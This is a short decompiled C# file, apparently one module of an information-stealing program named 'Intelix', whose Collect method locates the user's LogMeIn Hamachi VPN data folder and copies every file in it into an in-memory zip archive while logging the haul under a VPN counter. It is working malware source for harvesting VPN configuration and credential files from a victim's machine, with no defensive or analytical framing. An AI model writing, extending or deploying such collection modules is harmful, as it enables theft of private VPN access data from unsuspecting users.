using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x0200000A RID: 10
	public class Hamachi : ITarget
	{
		// Token: 0x06000026 RID: 38 RVA: 0x00002A0C File Offset: 0x00000C0C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "LogMeIn Hamachi");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string text2 = "LogMeIn Hamachi";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "LogMeIn Hamachi";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
